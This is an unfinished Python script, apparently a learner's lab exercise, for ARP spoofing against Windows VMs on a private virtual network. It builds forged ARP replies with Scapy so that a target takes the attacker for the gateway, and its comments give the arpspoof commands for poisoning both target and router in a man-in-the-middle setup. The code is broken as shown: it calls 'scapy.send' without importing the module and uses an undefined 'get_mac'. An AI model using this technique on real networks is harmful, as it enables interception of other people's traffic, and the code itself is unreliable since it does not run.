#/usr/bin/env python
# Rebuild
from scapy.layers.l2 import ARP, Ether

# These values are for my virtual network only
# You should be able to substiture your own in here
target_interface_1 = "192.168.63.174" # IP Windows10_1 VM Target.
target_interface_2 = "192.168.63.177" # IP Windows10_2 VM Target.
target_mac_1 = "00:0c:29:3a:62:c0"
router_ip = "192.168.63.2"
my_ip = "192.168.63.139"
my_mac = "00-0c-29-fe-37-29"

# TODO UPDATE THIS TO REAME
# Prior to Spoofing, the Target machine can ping and connect to my webserver.
# BASIC DEMONSTRATION OF WHAT WE HOPE TO ACHIEVE
# Using arpspoof at the command line, run both in different windows
# FOOL THE TARGET
# sudo arpspoof -i eth0 [TARGET IP] -t [GATEWAY IP]
# FOOL THE ROUTER (GATEWAY)
# sudo arpspoof -i eth0 [GATEWAY IP] -t [TARGET IP]
# TESTED: Spoof running, Target machine can ping out, and load my webserver.
# Which had stopped working in the complete script.

# CREATE AN ARP PACKET and store it in packet
# op=2: specifies an ARP reply packet (is-at),
# used to announce or update MAC address mappings in an ARP Cache.
# pdst: IP Target (Destination) computer.
# hwdst: The Target (Destination) MAC Address.
# psrc: source IP, which is the IP of the Router (Gateway)
# The target machine will think the packet has come from the Router

packet = ARP(op=2, pdst=target_interface_1, hwdst=target_mac_1, psrc=router_ip)
# packet.show() will show us the MAC Address of the Router IP [*hwsrc*] is now our MAC.
# packet.summary() provides similar, in the format: ARP is at [OUR_MAC_ADDRESS] says [ROUTER_IP]
# packet = ARP(op=2, pdst=target_interface_1, hwdst=target_mac_1, psrc=router_ip)
# print(packet.show())
# print(packet.summary())
# Send our scapy ARP packet to the target IP address.
# scapy.send(packet)

# So, previously we fooled the target into thinking we are the router.
# But we also need to fool the router into thinking we are the target
# We can build a function to do this:

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet)

